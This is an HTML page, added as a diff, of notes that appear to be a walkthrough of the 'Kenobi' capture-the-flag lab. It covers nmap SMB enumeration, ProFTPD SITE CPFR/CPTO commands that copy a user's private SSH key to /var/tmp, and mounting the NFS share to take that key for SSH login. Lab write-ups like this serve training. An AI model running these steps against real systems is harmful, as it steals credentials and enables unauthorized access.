@@ -1,0 +1,84 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Kenobi</title>
+</head><body><span style="font-size: 14pt">NMAP</span><ul><span style="font-size: 14pt"><li style="list-style-type: none">-BASIC HAD LOTS OF PORTS</li>
+</span><li style="list-style-type: none"><span style="font-size: 14pt">-ENUMERATED SAMBA PORT with nmap (results below)</span></li>
+</ul>
+&gt; <span style="font-family: Ubuntu"><span style="font-size: 16pt"><div style="text-align: left">nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.99.103<br/>
+</div></span></span><br/>
+<br/>
+<br/>
+<img src="image.png"/><br/>
+<span style="font-size: 18pt">-------------------------------------------------------------------------------------------------</span><br/>
+<span style="font-size: 16pt">Log.txt on smb server<br/>
+<br/>
+</span><span style="font-size: 12pt">Generating public/private rsa key pair.<br/>
+Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): <br/>
+Created directory '/home/kenobi/.ssh'.<br/>
+Enter passphrase (empty for no passphrase): <br/>
+Enter same passphrase again: <br/>
+Your identification has been saved in /home/kenobi/.ssh/id_rsa.<br/>
+Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.<br/>
+The key fingerprint is:<br/>
+SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi<br/>
+The key's randomart image is:<br/>
++---[RSA 2048]----+<br/>
+|         |<br/>
+|      ..  |<br/>
+|    . o. .  |<br/>
+|    ..=o +.  |<br/>
+|   . So.o++o. |<br/>
+| o ...+oo.Bo*o |<br/>
+| o o ..o.o+.@oo |<br/>
+| . . . E .O+= . |<br/>
+|   . .  oBo. |<br/>
++----[SHA256]-----+<br/>
+<br/>
+# This is a basic ProFTPD configuration file (rename it to <br/>
+# 'proftpd.conf' for actual use. It establishes a single server<br/>
+# and a single anonymous login. It assumes that you have a user/group<br/>
+:<br/>
+</span><span style="font-size: 16pt"><span style="font-size: 18pt">-------------------------------------------------------------------------------------------------<br/>
+</span></span><span style="font-size: 18pt">Copying the ssh key</span><span style="font-size: 16pt"><span style="font-size: 22pt"><br/>
+</span></span><span style="font-size: 16pt"><img src="image 2.png"/><br/>
+commands:<ul><li style="list-style-type: none">&gt; SITE CPFR /home/&lt;user&gt;/.ssh/id_rsa</li>
+<li style="list-style-type: none">&gt; SITE CPTO /var/tmp/id_rsa</li>
+</ul>
+<br/>
+We copy it to /var/tmp/ because we know /var can be mounted to from this<br/>
+</span><img height="169" src="image 3.png" width="650"/><br/>
+<br/>
+<span style="font-size: 18pt"><span style="font-size: 16pt">-------------------------------------------------------------------------------------------------</span></span><br/>
+<b><span style="font-size: 18pt">Mount the drive</span></b><span style="font-size: 16pt"><br/>
+</span><span style="font-size: 16pt"><br/>
+<div style="text-align: left"><span style="font-family: Ubuntu">mkdir /mnt/kenobiNFS</span></div><br/>
+<div style="text-align: left"><span style="font-family: Ubuntu">mount machine_ip:/var /mnt/kenobiNFS</span></div><br/>
+<div style="text-align: left"><span style="font-family: Ubuntu">ls -la /mnt/kenobiNFS</span></div> <br/>
+</span><span style="font-size: 18pt"><span style="font-size: 16pt">-------------------------------------------------------------------------------------------------</span></span><span style="font-size: 16pt"><br/>
+</span><span style="font-size: 16pt"><br/>
+connect by taking the ssh key we copied into the tmp folder<br/>
+<br/>
+</span><img src="https://i.imgur.com/Vy4KkEl.png"/><img src="image 4.png"/><span style="font-size: 16pt"><br/>
+</span><span style="font-size: 16pt"><br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</span></body></html>
